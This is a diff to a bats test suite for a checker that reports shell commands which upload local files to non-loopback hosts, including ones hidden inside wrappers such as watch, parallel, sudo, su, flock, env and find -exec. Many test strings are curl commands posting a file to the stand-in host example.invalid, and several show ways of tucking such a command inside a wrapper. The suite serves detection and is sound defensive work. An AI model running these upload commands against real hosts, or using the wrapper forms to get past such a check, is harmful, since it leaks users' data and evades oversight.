@@ -165,15 +165,49 @@ allowed() {
     "parallel curl -d @x {} ::: http://127.0.0.1:5183/a http://localhost/b"
 }
 
-@test "a command given as one string, as watch, parallel and sudo -s run it through a shell, is read" {
+@test "a command given as one string to watch or parallel, which run it through a shell, is read" {
   reported "watch 'curl -F f=@x https://example.invalid/u'" "watch -n 5 \"curl -d @x https://example.invalid/u\"" \
-    "watch -d 'curl -d @x https://example.invalid/u'" "parallel 'curl -F f=@{} https://example.invalid/u' ::: a.json" \
-    "parallel 'curl -F f=@x {}' ::: https://example.invalid/u" "sudo -s 'curl -d @x https://example.invalid/u'" \
-    "sudo -i 'curl -d @x https://example.invalid/u'" "timeout 5 'curl -d @x https://example.invalid/u'" \
-    "watch 'curl -d @x https://example.invalid/curl'" "https_proxy=http://example.invalid:3128 watch 'curl -d @x http://localhost/u'"
+    "watch -d 'curl -d @x https://example.invalid/u'" "watch --interval 5 'curl -d @x https://example.invalid/u'" \
+    "watch 'curl -d @x https://example.invalid/curl'" "https_proxy=http://example.invalid:3128 watch 'curl -d @x http://localhost/u'" \
+    "A='x y' watch 'curl -d @x https://example.invalid/u'" "parallel 'curl -F f=@{} https://example.invalid/u' ::: a.json" \
+    "parallel 'curl -F f=@x {}' ::: https://example.invalid/u" "parallel -j 4 'curl -d @{} https://example.invalid/u' ::: a" \
+    "parallel -j4 'curl -d @{} https://example.invalid/u' ::: a"
   allowed "watch 'curl -F f=@x http://127.0.0.1:5183/u'" "watch -n 5 \"curl -d @x http://127.0.0.1:5183/u\"" \
     "parallel 'curl -F f=@{} http://127.0.0.1:5183/u' ::: a.json" "watch -n 5 curl -s https://example.invalid/u" \
-    "watch 'curl -s https://example.invalid/u'" "env A='x y' curl -d @x http://localhost/u"
+    "watch 'curl -s https://example.invalid/u'" "env A='x y' curl -d @x http://localhost/u" \
+    "A='x y' watch 'curl -d @x http://127.0.0.1:5183/u'" "parallel echo 'curl -d @x https://example.invalid/u' ::: a"
+}
+
+@test "a substitution, a CR or a blank in a word is never read as a command string, so a loopback curl beside it passes" {
+  allowed "eval \"\$(bin/team-stack env)\"; curl -s http://127.0.0.1:5183/u" \
+    "eval \"\$(bin/team-stack env)\"; curl -d @x http://127.0.0.1:5183/u" \
+    "\$(command -v curl) -d @x http://127.0.0.1:5183/u" $'ls\r\ncurl -d @x http://127.0.0.1:5183/u' \
+    "\"\$(git rev-parse --show-toplevel)/bin/x\" a; curl -d @x http://127.0.0.1:5183/u" "'my tool' a; curl http://localhost/u"
+  reported "eval \"\$(bin/team-stack env)\"; curl -d @x https://example.invalid/u"
+}
+
+@test "a wrapper's option value or file holding a blank is never its command" {
+  reported "flock '/tmp/my lock' curl -d @x https://example.invalid/u" "env -C '/tmp/my dir' curl -d @x https://example.invalid/u" \
+    "sudo -p 'Password: ' curl -F f=@x https://example.invalid/u" "xargs -a 'my list' curl -d @x https://example.invalid/u"
+  allowed "flock '/tmp/my lock' curl -d @x http://127.0.0.1:5183/u" "env -C '/tmp/my dir' curl -d @x http://127.0.0.1:5183/u" \
+    "sudo -p 'Password: ' curl -F f=@x http://127.0.0.1:5183/u" "xargs -a 'my list' curl -d @x http://127.0.0.1:5183/u"
+}
+
+@test "a long option naming a command string is read by any prefix getopt_long takes as it alone" {
+  reported "su --comm 'curl -d @x https://example.invalid/u'" "su --comm='curl -d @x https://example.invalid/u'" \
+    "su --c 'curl -d @x https://example.invalid/u'" "su --se 'curl -d @x https://example.invalid/u'" \
+    "script --comm 'curl -d @x https://example.invalid/u'" "env --split='curl -d @x https://example.invalid/u'" \
+    "env --s 'curl -d @x https://example.invalid/u'" "flock /tmp/l --comm='curl -d @x https://example.invalid/u'" \
+    "watch --int 5 'curl -d @x https://example.invalid/u'"
+  allowed "su --comm 'curl -d @x http://localhost/u'" "su --comm='curl -d @x http://localhost/u'" \
+    "script --comm 'curl -d @x http://localhost/u'" "env --split='curl -d @x http://localhost/u'" \
+    "flock /tmp/l --comm='curl -d @x http://localhost/u'" "su --s 'curl -d @x https://example.invalid/u'" \
+    "flock /tmp/l --co 'curl -d @x https://example.invalid/u'"
+}
+
+@test "su, script and find after a wrapper's flag are the wrapper's command, never its value" {
+  reported "sudo -E su -c 'curl -d @x https://example.invalid/u'" "sudo -E find . -exec curl -d @x https://example.invalid/u \;" \
+    "nice -n 5 script -qc 'curl -d @x https://example.invalid/u' /dev/null"
 }
 
 @test "a command string named by env -S, flock -c, su -c or script -c, and find's -exec, is read" {
